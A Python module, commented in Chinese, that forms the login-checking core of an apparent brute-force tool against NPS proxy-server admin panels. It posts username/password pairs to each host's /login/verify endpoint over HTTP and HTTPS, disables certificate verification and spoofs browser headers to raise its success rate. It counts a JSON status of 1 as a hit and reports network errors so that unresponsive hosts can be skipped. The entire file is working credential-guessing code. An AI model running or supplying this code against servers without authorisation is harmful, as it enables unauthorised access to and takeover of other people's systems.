# -*- coding: utf-8 -*-
# 认证模块 - 负责处理与 NPS 登录认证相关的网络请求和响应判断。

import requests # 导入 requests 库，用于发送 HTTP 请求
import json     # 导入 json 库，用于解析 JSON 响应
import sys      # 导入 sys 模块，用于打印到标准错误
from urllib.parse import urljoin # 导入 urljoin 函数，用于拼接 URL

# 禁用 requests 库的 HTTPS 警告，因为通常在测试时可能遇到自签名证书
# Note: Consider making this conditional based on a flag if needed.
try:
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
except AttributeError:
    # Handle cases where the library structure might change slightly
    pass


def is_successful(resp_text, verbose=False, pbar=None):
    """
    检查 API 响应文本是否表示 NPS 登录成功。
    根据 NPS 的特定特征判断：成功时通常返回一个 JSON 对象，其中包含 "status": 1。

    Args:
        resp_text (str): NPS 登录验证接口返回的响应文本内容。
        verbose (bool): 是否启用详细输出模式。在详细模式下会打印解析失败等信息。
        pbar (tqdm.Tqdm or DummyPbar, optional): 进度条对象，用于在详细模式下安全地打印信息，避免干扰进度条。默认为 None。

    Returns:
        bool: 如果响应文本符合成功特征则返回 True，否则返回 False。
    """
    output_func = pbar.write if pbar else print # Choose output function based on pbar

    if not resp_text: # 如果响应文本为空，直接判断为失败
        if verbose:
            output_func("[-] 登录验证响应文本为空，判断为失败。", file=sys.stderr)
        return False

    try:
        # 尝试将响应文本解析为 JSON 对象
        data = json.loads(resp_text)
        # 检查 JSON 对象中是否存在 'status' 键，且其值是否等于 1
        # Use .get() for safer access
        return data.get("status") == 1
    except json.JSONDecodeError:
        # 如果响应文本不是有效的 JSON 格式
        if verbose:
            # Show only a snippet of the non-JSON response
            snippet = resp_text[:100].replace('\n', ' ') + ('...' if len(resp_text) > 100 else '')
            output_func(f"[-] 登录验证响应非 JSON 格式，判断为失败。响应片段: {snippet}", file=sys.stderr)
        return False
    except Exception as e:
        # 捕获其他可能发生的异常（例如，响应文本不是字符串等）
        if verbose:
            output_func(f"[-] 检查登录成功状态时发生意外错误: {e}", file=sys.stderr)
        return False


def try_password(session, host, username, password, verbose=False, pbar=None):
    """
    对单个目标主机使用指定的用户名和密码尝试登录。
    函数会首先尝试 HTTP 协议，如果失败则尝试 HTTPS 协议。
    遇到网络错误（超时、连接错误、请求异常等）时会立即返回相应的状态。

    Args:
        session (requests.Session): 用于发送请求的 requests 会话对象。使用 Session 可以保持 cookie，提高效率。
        host (str): 目标主机的地址 (格式: host:port)。
        username (str): 用于尝试登录的用户名。
        password (str): 用于尝试登录的密码。
        verbose (bool): 是否启用详细输出模式。
        pbar (tqdm.Tqdm or DummyPbar, optional): 进度条对象，用于在详细模式下安全打印信息。

    Returns:
        tuple: 一个包含三个元素的元组 (success: bool, scheme: str or None, status: str)。
               - success: 布尔值，表示是否成功登录。
               - scheme: 字符串，成功登录时使用的协议 ('http' 或 'https')；失败时为 None。
               - status: 字符串，尝试结果的状态。可能的取值包括:
                         "success": 成功登录。
                         "login_failed_all_protocols": HTTP 和 HTTPS 尝试登录均失败。
                         "network_timeout": 请求超时。
                         "network_connection_error": 无法建立连接。
                         "network_request_exception": 其他 requests 请求异常。
                         "other_error": 其他意外错误。
    """
    output_func = pbar.write if pbar else print # 根据 pbar 是否存在选择输出函数

    # 遍历尝试 HTTP 和 HTTPS 两种协议
    for scheme in ("http", "https"):
        base_url = f"{scheme}://{host}" # 构建基础 URL
        login_url = urljoin(base_url, "/login/verify") # 拼接登录验证接口的完整 URL

        # 定义请求头，模拟常见的浏览器行为，以增加成功率
        headers = {
            "X-Requested-With": "XMLHttpRequest", # 模拟 Ajax 请求
            "Accept": "*/*", # 接受任意类型的响应
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", # 请求体类型为表单数据
            "Origin": base_url, # 请求来源
            "Referer": urljoin(base_url, "/login/index"), # 模拟从登录页跳转
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", # 使用常见的 User-Agent
            "Cookie": "lang=zh-CN" # 设置语言 cookie 为中文 (can be parameterized if needed)
        }

        # 定义 POST 请求体数据，包含用户名和密码
        data = {"username": username, "password": password}

        try:
            # 发送 POST 请求到登录接口
            # timeout=10: 设置请求超时时间为 10 秒
            # verify=False: 禁用 SSL 证书验证，忽略证书错误
            resp = session.post(login_url, headers=headers, data=data, timeout=10, verify=False)

            # Check for common non-success status codes before checking content
            if resp.status_code >= 400: # 如果返回的状态码表示客户端或服务器错误
                 if verbose:
                     # Provide more context in the error message
                     output_func(f"[-] 尝试 {username}/{password} 到 {scheme}://{host} 失败，HTTP 状态码: {resp.status_code}", file=sys.stderr)
                 continue # 继续尝试下一个协议 (如果存在)

            # 调用 is_successful 函数检查响应是否表示登录成功
            if is_successful(resp.text, verbose, pbar):
                return True, scheme, "success" # 成功登录，返回成功状态、使用的协议和状态码

            else: # 如果 is_successful 返回 False，表示登录失败 (but connection was successful)
                 if verbose:
                     # Clarify that the login check failed, not the connection
                     output_func(f"[-] 尝试 {username}/{password} 到 {scheme}://{host} 连接成功，但登录验证失败 (NPS JSON 判断)。", file=sys.stderr)
                 # No need to continue to next protocol if login check failed on one
                 # return False, None, "login_failed" # Or let it fall through to try HTTPS

        except requests.exceptions.Timeout: # 捕获请求超时异常
             if verbose:
                 output_func(f"[-] 尝试 {username}/{password} 到 {scheme}://{host} 请求超时", file=sys.stderr)
             # 遇到网络错误立即返回状态，以便在外层函数中计数并可能跳过该主机
             return False, None, "network_timeout"
        except requests.exceptions.SSLError as ssl_err: # Catch SSL errors specifically
             if verbose:
                 output_func(f"[-] 尝试 {username}/{password} 到 {scheme}://{host} 时发生 SSL 错误: {ssl_err}", file=sys.stderr)
             # Treat SSL errors like connection errors for failure counting
             return False, None, "network_connection_error" # Or a specific "network_ssl_error"
        except requests.exceptions.ConnectionError as conn_err: # 捕获连接错误异常
             if verbose:
                 # Provide slightly more detail if possible
                 output_func(f"[-] 无法连接到 {scheme}://{host} (尝试 {username}/{password}): {conn_err}", file=sys.stderr)
             return False, None, "network_connection_error"
        except requests.exceptions.RequestException as req_err: # 捕获 requests 库的其他所有请求异常
            if verbose:
                output_func(f"[-] 请求 {scheme}://{host} (尝试 {username}/{password}) 时发生请求异常: {req_err}", file=sys.stderr)
            return False, None, "network_request_exception"
        except Exception as e: # 捕获其他所有意外异常
            if verbose:
                output_func(f"[-] 处理 {scheme}://{host} (尝试 {username}/{password}) 时发生意外错误: {e}", file=sys.stderr)
            return False, None, "other_error"

    # 如果遍历完所有协议（HTTP 和 HTTPS）都没有成功登录或遇到决定性的网络错误
    # If loop finishes without returning success or a network error that stops retries
    return False, None, "login_failed_all_protocols" # 表示所有尝试均失败
